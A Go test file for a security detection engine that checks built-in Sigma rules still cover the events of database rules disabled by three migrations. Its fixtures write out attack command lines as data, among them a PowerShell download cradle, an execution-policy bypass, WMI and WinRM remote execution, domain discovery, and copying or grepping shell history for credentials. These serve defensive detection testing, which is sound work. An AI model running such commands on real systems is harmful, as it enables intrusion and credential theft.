package detection

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Migration 377 disables seven `rules` rows because sigma_builtins.go now carries
// their selectors. That split is the dangerous kind: the deletion and the
// replacement live in different files, in different languages, and neither one
// fails if the other is wrong. Delete the builtin and the migration silently
// removes coverage; revert the migration and the double-counting silently comes
// back. Nothing in the build connects them.
//
// This test is that connection. For every rule 377 disables it asserts BOTH
// halves at once:
//
//   - the migration really disables it (parsed out of the SQL, not assumed), and
//   - an event that the DB row matched still matches a built-in.
//
// The events below are deliberately the ones the pre-existing built-ins MISSED —
// `wmic /node:` with no "process call create", `sudo docker exec`, crictl. Those
// are the cases that made "just disable the duplicate row" lossy here, unlike
// main's migration 374 where the built-in was a genuine superset. Writing the
// test against the easy cases would pass without proving anything.
//
// It is a coverage test, not a false-positive test: it says the technique is
// still detected somewhere in the api path. Whether the rule is too noisy is the
// FP soak's question, not this one's.

const (
	mig377 = "377_disable_db_rules_ported_to_builtins.sql"
	mig383 = "383_disable_remaining_builtin_parity_rules.sql"
	mig430 = "430_disable_t1552_003_duplicate_db_rules.sql"
)

// portedDBRules pairs each rule migration 377 or 381 disables with events that the DB
// row matched, and the built-in title that must now catch each one.
var portedDBRules = []struct {
	dbRule    string
	migration string
	cases     []struct {
		why     string
		builtin string
		event   map[string]interface{}
	}
}{
	{
		dbRule:    "WMI Remote Command Execution",
		migration: mig377,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// The reason the DB row could not simply be dropped: the built-in
				// "Remote WMI Process Creation via wmic" ANDs in "process call
				// create", so a bare /node: invocation was invisible to it.
				why:     "wmic /node: without 'process call create'",
				builtin: "WMI Remote Command Execution",
				event: portedProc(`C:\Windows\System32\wbem\wmic.exe`,
					`wmic /node:10.0.0.5 /user:admin os get name`, ""),
			},
			{
				why:     "WmiPrvSE spawning a shell",
				builtin: "WMI Remote Command Execution",
				event: portedProc(`C:\Windows\System32\cmd.exe`, `cmd.exe /c whoami`,
					`C:\Windows\System32\wbem\WmiPrvSE.exe`),
			},
		},
	},
	{
		dbRule:    "疑わしいPowerShell実行",
		migration: mig377,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "DownloadString cradle",
				builtin: "疑わしいPowerShell実行",
				event: portedProc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
					`powershell.exe -c "(New-Object Net.WebClient).DownloadString('http://x/a.ps1')"`, ""),
			},
			{
				why:     "execution-policy bypass",
				builtin: "疑わしいPowerShell実行",
				event: portedProc(`C:\Program Files\PowerShell\7\pwsh.exe`,
					`pwsh.exe -ExecutionPolicy Bypass -File a.ps1`, ""),
			},
		},
	},
	{
		dbRule:    "Suspicious chmod of Executable in /tmp",
		migration: mig377,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "chmod +x on a /tmp payload",
				builtin: "Suspicious chmod of Executable in /tmp",
				event:   portedProc("/usr/bin/chmod", "chmod +x /tmp/payload", ""),
			},
			{
				why:     "chmod 777 under /dev/shm",
				builtin: "Suspicious chmod of Executable in /tmp",
				event:   portedProc("/bin/chmod", "chmod 777 /dev/shm/x", ""),
			},
		},
	},
	{
		dbRule:    "Script Execution from World-Writable Directory (Linux)",
		migration: mig377,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "bash /tmp/ script",
				builtin: "Script Execution from World-Writable Directory (Linux)",
				event:   portedProc("/bin/bash", "bash /tmp/install.sh", ""),
			},
			{
				why:     "sh /var/tmp/ script",
				builtin: "Script Execution from World-Writable Directory (Linux)",
				event:   portedProc("/bin/sh", "sh /var/tmp/stage2.sh", ""),
			},
		},
	},
	{
		dbRule:    "Container Image Build on Host (DB)",
		migration: mig377,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// Absorbed into the built-in as `cmdline_only`. Image is /sudo, so
				// the built-in's Image|endswith branch does not apply.
				why:     "sudo-wrapped docker build (Image is the wrapper)",
				builtin: "Container Image Build on Host",
				event:   portedProc("/usr/bin/sudo", "sudo docker build -t evil .", ""),
			},
			{
				why:     "direct docker build",
				builtin: "Container Image Build on Host",
				event:   portedProc("/usr/bin/docker", "docker build -t evil .", ""),
			},
		},
	},
	{
		dbRule:    "Container Administration Command (DB)",
		migration: mig377,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// crictl is absent from the built-in's Image|endswith list entirely.
				why:     "crictl exec",
				builtin: "Container Administration Command Execution",
				event:   portedProc("/usr/bin/crictl", "crictl exec -it abc123 sh", ""),
			},
			{
				why:     "sudo-wrapped docker exec (Image is the wrapper)",
				builtin: "Container Administration Command Execution",
				event:   portedProc("/usr/bin/sudo", "sudo docker exec -it web sh", ""),
			},
		},
	},
	{
		dbRule:    "Linux Shell Init File Modification (FIM)",
		migration: mig377,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     ".bashrc written (file_event, no command line)",
				builtin: "Linux Shell Init File Modification (FIM)",
				event: map[string]interface{}{
					"type":      "file",
					"path":      "/home/alice/.bashrc",
					"operation": "FILE_ACTION_MODIFY",
				},
			},
			{
				why:     "/etc/profile.d drop-in",
				builtin: "Linux Shell Init File Modification (FIM)",
				event: map[string]interface{}{
					"type":      "file",
					"path":      "/etc/profile.d/00-evil.sh",
					"operation": "FILE_ACTION_MODIFY",
				},
			},
		},
	},
	{
		dbRule:    "WinRM Lateral Movement (DB)",
		migration: mig383,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// The only one of 381's five that was NOT already a subset: the
				// builtin matched winrs via Image, so a wrapper invocation slipped
				// past it. Absorbed as the winrs_cmdline branch.
				why:     "wrapper-invoked winrs (Image is cmd.exe, not winrs.exe)",
				builtin: "WinRM Lateral Movement (winrs / PowerShell Remoting)",
				event: portedProc(`C:\Windows\System32\cmd.exe`,
					`cmd /c winrs -r:dc01 "whoami"`, ""),
			},
			{
				why:     "Enter-PSSession",
				builtin: "WinRM Lateral Movement (winrs / PowerShell Remoting)",
				event: portedProc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
					`powershell Enter-PSSession -ComputerName dc01`, ""),
			},
		},
	},
	{
		dbRule:    "Remote System Discovery (DB)",
		migration: mig383,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "nltest domain controller enumeration",
				builtin: "Remote System and Domain Controller Discovery",
				event:   portedProc(`C:\Windows\System32\nltest.exe`, `nltest /dclist:corp.local`, ""),
			},
		},
	},
	{
		dbRule:    "Domain Account Discovery (DB)",
		migration: mig383,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// adsisearcher is in the DB row's tools branch; the builtin carries
				// it too (verified term-by-term), which is why no absorption was
				// needed here.
				why:     "adsisearcher user enumeration",
				builtin: "Domain Account Discovery",
				event: portedProc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
					`powershell ([adsisearcher]"(objectClass=user)").FindAll()`, ""),
			},
			{
				why:     "net user /domain",
				builtin: "Domain Account Discovery",
				event:   portedProc(`C:\Windows\System32\net.exe`, `net user bob /domain`, ""),
			},
		},
	},
	{
		dbRule:    "Domain Group Discovery (DB)",
		migration: mig383,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "net group /domain",
				builtin: "Domain Group Discovery",
				event:   portedProc(`C:\Windows\System32\net.exe`, `net group "Domain Admins" /domain`, ""),
			},
		},
	},
	{
		dbRule:    "Network Share Discovery (DB)",
		migration: mig383,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "Get-SmbShare",
				builtin: "Network Share Discovery",
				event: portedProc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
					`powershell Get-SmbShare`, ""),
			},
			{
				why:     "net share",
				builtin: "Network Share Discovery",
				event:   portedProc(`C:\Windows\System32\net.exe`, `net share`, ""),
			},
		},
	},

	// ── migration 430: T1552.003 の 4 本を 1 本に統合 ──
	//
	// この 2 行と、削除した builtin `Credential Search in Shell History` は、
	// 残す builtin `Shell History Credential Search` と同じ検知だった。
	// 4 本あることは技法 dedup のせいで観測できず、#746 で 3 本だけ狭めて
	// 誤検知が残るという実害が出ている（migration 430 のヘッダ参照）。
	//
	// ここに置く代表イベントは、**統合前の builtin が取り逃していた形**を選ぶ。
	// 当たりやすい .bash_history で書くと、統合の可否を何も証明せずに緑になる。
	{
		dbRule:    "Credential Harvesting from Shell or DB History",
		migration: mig430,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// 統合前の builtin に .dbshell は無かった。この 1 語のために
				// history_file へ取り込んである。
				why:     "mongo シェルの履歴 (.dbshell) からの資格情報検索",
				builtin: "Shell History Credential Search",
				event:   portedProc("/bin/grep", "grep -i password /home/v/.dbshell", ""),
			},
			{
				why:     "DB クライアント履歴の持ち出し",
				builtin: "Shell History Credential Search",
				event:   portedProc("/bin/cp", "cp /home/v/.psql_history /tmp/.x", ""),
			},
		},
	},
	{
		dbRule:    "Shell History Credential Search (DB)",
		migration: mig430,
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// この行は builtin の parity 行（migration 350）で、427 で条件を
				// 揃えた後は逐語同一である。取り逃していた形は無いので、
				// 代わりに「builtin より広い側」を持たない証拠として、この行が
				// 拾える全ての履歴ファイル種別を並べる。
				why:     "zsh 履歴からの資格情報検索",
				builtin: "Shell History Credential Search",
				event:   portedProc("/usr/bin/grep", "grep -E 'aws_secret|token' /Users/v/.zsh_history", ""),
			},
			{
				why:     "mysql クライアント履歴の base64 化",
				builtin: "Shell History Credential Search",
				event:   portedProc("/usr/bin/base64", "base64 /home/v/.mysql_history", ""),
			},
			{
				// 削除した builtin `Credential Search in Shell History` だけが
				// 持っていた語。統合で history_file へ取り込んである。
				why:     "ksh/csh の ~/.history からの資格情報検索",
				builtin: "Shell History Credential Search",
				event:   portedProc("/bin/grep", "grep -i credential /home/v/.history", ""),
			},
		},
	},
}

func portedProc(image, cmdline, parent string) map[string]interface{} {
	e := map[string]interface{}{
		"type":         "process",
		"image_path":   image,
		"command_line": cmdline,
	}
	if parent != "" {
		e["parent_image_path"] = parent
	}
	return e
}

func TestDisabledDBRulesAreCoveredByBuiltins(t *testing.T) {
	ev := NewSigmaEvaluator()
	if n := LoadBuiltinRules(ev); n == 0 {
		t.Fatal("no builtin rules loaded — every assertion below would be vacuous")
	}

	for _, r := range portedDBRules {
		for _, c := range r.cases {
			t.Run(r.dbRule+"/"+c.why, func(t *testing.T) {
				event := map[string]interface{}{}
				for k, v := range c.event {
					event[k] = v
				}
				addPipelineSigmaAliases(event)

				var titles []string
				for _, m := range ev.EvaluateEvent(event) {
					if m.RuleTitle == c.builtin {
						return
					}
					titles = append(titles, m.RuleTitle)
				}
				// 移設元の migration は行ごとに違う (377 / 383 / 430)。固定文字列で
				// 「377」と書くと、430 の行が落ちたときに無関係な migration を
				// 見に行かせることになる。
				t.Errorf("%s disables the `rules` row %q, and this event matched it, "+
					"but builtin %q did not fire.\n"+
					"  event:   %v\n"+
					"  matched: %v\n"+
					"  Disabling the DB row is only lossless while the builtin covers it. "+
					"Either restore the builtin selector or revert the row's disable in %s — "+
					"do not delete this case, it is the evidence that the swap was safe.",
					r.migration, r.dbRule, c.builtin, event, titles, r.migration)
			})
		}
	}
}

// The other half: 377 must actually disable exactly the rules this file claims,
// read out of the SQL. Without this, renaming a rule in the migration (or
// dropping a statement in a merge) leaves the test above asserting coverage for
// a row that is still live — passing while proving nothing.
func TestPortMigrationsDisableExactlyThePortedRules(t *testing.T) {
	for _, mig := range []string{mig377, mig383, mig430} {
		b, err := os.ReadFile(filepath.Join("..", "..", "migrations", mig))
		if err != nil {
			t.Fatalf("read %s: %v", mig, err)
		}
		sql := string(b)

		// Every rule this file vouches for under `mig` must actually be disabled there.
		for _, r := range portedDBRules {
			if r.migration != mig {
				continue
			}
			want := "WHERE name = '" + r.dbRule + "'"
			if !strings.Contains(sql, want) {
				t.Errorf("%s does not disable %q (looked for %s) — this file asserts a builtin "+
					"covers it, which is only worth asserting if the DB row is actually gone",
					mig, r.dbRule, want)
			}
		}

		// And nothing beyond them: an extra disable would remove coverage that no
		// case here vouches for.
		for _, line := range strings.Split(sql, "\n") {
			line = strings.TrimSpace(line)
			rest, ok := strings.CutPrefix(line, "WHERE name = '")
			if !ok {
				continue
			}
			name := strings.TrimSuffix(strings.TrimSuffix(rest, ";"), "'")
			found := false
			for _, r := range portedDBRules {
				if r.migration == mig && r.dbRule == name {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("%s disables %q but no case in portedDBRules shows a builtin still "+
					"covers it — add the evidence or drop the statement", mig, name)
			}
		}
	}
}
